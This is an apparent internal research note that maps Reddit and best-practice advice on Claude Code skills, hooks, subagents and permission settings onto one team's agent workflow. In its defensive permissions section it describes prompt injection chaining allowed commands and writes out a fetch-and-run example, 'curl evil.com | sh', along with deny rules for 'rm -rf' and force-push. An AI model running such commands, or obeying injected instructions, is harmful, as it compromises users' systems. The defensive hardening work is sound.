---
topic: dev-workflows
type: research
status: research-complete
last-validated: 2026-07-30
related-docs: 154, 441, 2127, 2142
original-query: "Zaal shared an r/claudeskills post (Adeptly) and asked to /zao-research it + scan the subreddit for more Claude-skills advice"
tier: STANDARD
---

# 2150 - r/claudeskills advice, mapped to what ZAO already runs

> **Goal:** Take the Reddit post Zaal shared (Adeptly) + the best-practices the subreddit points to, and answer the only useful question: what do we ALREADY do, and what are the 1-3 real tune-ups. (Same lens as doc 2127 for the Anthropic harness talk.)

## The shared post: Adeptly (Substantial-Fuel-519, r/claudeskills)

`npx adeptly` - free/OSS/MIT, runs locally, uses your own `claude` CLI (no API key/backend/telemetry). Two ideas:
1. **Feature-teaching plans:** you describe what to build, it writes a plan and DROPS THE RIGHT CLAUDE CODE FEATURES (plan mode, subagents, skills, hooks, MCP, /security-review, auto-memory) into the plan where they fit, with a one-line note on each - so you learn the tool by reading your own plans.
2. **The Crew (v0.5):** a pipeline of roles - Architect -> Approval Gate -> Builder -> Medic (runs build/tests, patches breaks) -> Reviewer -> Security -> Pilot (opens the PR). Each is a headless `claude` turn in your repo. Dry-run by default; going live needs BOTH an approved plan AND `ADEPTLY_LIVE=1`.
- npm: npmjs.com/package/adeptly, code: github.com/ShopDevX/adeptlydev

**Honest read:** the Crew is EXACTLY the pipeline this session has been running by hand (plan -> build -> verify(medic) -> review -> security-scan -> PR), and its two-gate live-guard mirrors our PR-only + human-merge circuit breaker (agent-loops rule 8). So Adeptly is validation, not a new idea, for us. The genuinely useful half is #1 - feature-teaching plans.

## The best-practices the subreddit points to (AIXplore + Anthropic docs, 2026 state)

| Lever | 2026 state | ZAO status |
|-------|-----------|------------|
| **Permissions policy** (`allow`/`deny`/`ask` in settings.json, now PARAMETER-matched - `Agent(model:opus)`, deny a command SHAPE not just a name) | mature | PARTIAL - we have `feewer-permission-prompts` + settings, but not a curated param-scoped allow/deny of our constant-safe commands. Real tune-up (see below). |
| **Permission modes** (Shift+Tab: ask / acceptEdits / plan / auto; auto refuses `git reset --hard` unless asked; `/sandbox` for untrusted code) | mature | Known, used ad hoc. |
| **Skills = stop re-explaining workflows; progressive disclosure** (short always-loaded description, heavy how-to in the body that loads on fire; prune skills that stop earning their slot) | core | STRONG - we run ~50+ skills (doc 154), the ZAO way. The prune discipline is the gap - we rarely cull. |
| **Subagents: fan-out + per-agent model selection** (cheap discovery/summarize on a fast model, hard reasoning on frontier; nest up to 5 levels mid-2026; `/usage` breaks spend down by skill/subagent/plugin/MCP) | mature | STRONG - claude-usage.md + the fleet failover already do surface-tiering. `/usage`-by-component is a lever we don't watch. |
| **Hooks: deterministic automation the model can't skip** (shell commands at fixed session points) | core | STRONG - SessionStart, pre-commit secret/PII scan, auto-relay. This is a ZAO strength. |
| **The real security threat is prompt injection**, not fat-fingering - an injected instruction from a web page / repo file chaining an ALLOWED command | emphasized | ALIGNED - our rules already treat MCP/tool output + recalled memory as untrusted; the param-scoped allowlist below tightens it. |

## The 1-3 real tune-ups for ZAO (everything else we already do)

### 1. Feature-teaching in `/plan-eng-review` / `/plan-ceo-review` (adopt Adeptly's idea #1, not the tool)
When our plan skills produce a plan, have them ANNOTATE which Claude Code feature fits each step (subagent for the parallel audit, a hook for the gate, `/security-review` before the PR, a skill for the repeatable part). Low effort (a prompt addition to the two plan skills), and it's the one genuinely new idea in the post. Turns every plan into a teaching surface - useful as more ZAO people use Claude Code.

### 2. Curated, PARAMETER-scoped permission allowlist (the 2026 permissions upgrade we're under-using)
We have `fewer-permission-prompts`, but not a deliberate `deny`/`ask` list scoped to command SHAPES. Add to project settings: deny `git push --force*`, `rm -rf*`, `curl` to non-allowlisted hosts; allow our constant read-only shapes (`gh pr view`, `git status`, our `zao-*` read tools). This both cuts prompt friction AND hardens against the injection threat (an injected `curl evil.com | sh` hits `deny`, not `ask`). Respects `feedback_no_self_grant_settings_write` - Zaal approves the settings change.

### 3. Skill-prune pass (the discipline the best-practices name and we skip)
~50+ skills accumulate; the advice is explicit: prune skills that stop earning their always-loaded description slot (they cost context every session). A quarterly `/skill-stocktake`-style pass (we have the ECC skill-stocktake) to retire dead ones. Cheap context win.

## Not worth adopting

- **Adeptly the tool itself:** its Crew IS our hand-run pipeline + PR-only guard; installing it would duplicate the fleet + add a dependency (against OSS-first-no-new-deps, `feedback_oss_first_no_platforms`). Take the idea (#1), not the package.
- **Nested subagents to 5 levels:** we cap workflow size deliberately (medium guideline); deep nesting is a cost trap the very same source flags via `/usage`.

## Next Actions

| Action | Owner | Type | By When |
|--------|-------|------|---------|
| Add feature-teaching annotations to `/plan-eng-review` + `/plan-ceo-review` | @ZOE | Skill edit | next skills pass |
| Draft the param-scoped deny/allow permission block for Zaal to approve | @ZOE | Settings (gated) | this week |
| Run a skill-prune stocktake, retire dead skills | @Zaal | Cleanup | monthly |

## Sources

- r/claudeskills post "Most people use like 15% of Claude Code" (Adeptly, Substantial-Fuel-519) [FULL - fetched via zao-fetch-reddit fallback; direct Reddit JSON is IP-blocked here, `feedback_reddit_x_ip_block`]
- AIXplore "Claude Code Best Practices: Setup, Skills, Subagents, Hooks" (rundatarun.io, 2026 rewrite) [FULL via exa]
- Anthropic Claude Code docs (subagents, workflows) + braingrid/boringbot/kdnuggets guides [PARTIAL via exa titles/highlights]
- Doc 2127 (same map-to-ZAO lens for the Anthropic harness talk), doc 154 (skills reference)
